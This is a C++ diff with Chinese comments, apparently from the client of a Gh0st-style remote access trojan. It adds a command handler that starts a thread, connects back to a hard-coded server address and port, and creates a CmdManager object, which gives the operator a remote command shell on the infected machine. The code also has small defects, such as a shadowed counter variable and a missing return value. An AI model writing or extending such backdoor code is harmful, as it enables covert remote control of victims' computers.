@@ -4,7 +4,7 @@
 CKernelManager::CKernelManager(CIocpClient* IocpClient) :CManager(IocpClient)
 {
 	int    m_ThreadHandleCount = 0;
-	memset(m_ThreadHandle, 0, sizeof(m_ThreadHandle));
+	memset(m_ThreadHandles, 0, sizeof(m_ThreadHandles));
 }
 CKernelManager::~CKernelManager()
 {
@@ -30,7 +30,7 @@ void CKernelManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
 	{
  
 		//启动一个线程
-		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
+		m_ThreadHandles[m_ThreadHandleCount++] = CreateThread(NULL, 0,
 			(LPTHREAD_START_ROUTINE)InstantMessageProcedure,
 			NULL, 0, NULL);
 
@@ -49,11 +49,21 @@ void CKernelManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
 		EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_SHUTDOWN_NAME);
 		break;
 	}
+	case CLIENT_CMD_MANAGER_REQUIRE:
+	{
+
+		//启动一个线程
+		m_ThreadHandles[m_ThreadHandleCount++] = CreateThread(NULL, 0,
+			(LPTHREAD_START_ROUTINE)CmdManagerProcedure,
+			NULL, 0, NULL);
+
+		break;
+	}
 	case CLIENT_PROCESS_MANAGER_REQUIRE:
 	{
 
 		//启动一个线程
-		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
+		m_ThreadHandles[m_ThreadHandleCount++] = CreateThread(NULL, 0,
 			(LPTHREAD_START_ROUTINE)ProcessManagerProcedure,
 			NULL, 0, NULL);
 
@@ -76,6 +86,21 @@ DWORD WINAPI InstantMessageProcedure(LPVOID ParameterData)
 	//等待服务器弹出窗口
 	IocpClient.WaitingForEvent();  //一个事件等待
 }
+
+DWORD WINAPI CmdManagerProcedure(LPVOID ParameterData)
+{
+	//生成新的iocp对象进行新的链接
+
+	CIocpClient	IocpClient;
+
+	if (!IocpClient.ConnectServer(__ServerAddress, __ConnectPort))
+		return -1;
+	CCmdManager CmdManager(&IocpClient);   //构造函数
+
+	//等待一个事件
+	IocpClient.WaitingForEvent();
+}
+
 
 //类的编码中不要使用使用全局
 DWORD WINAPI ProcessManagerProcedure(LPVOID ParameterData)
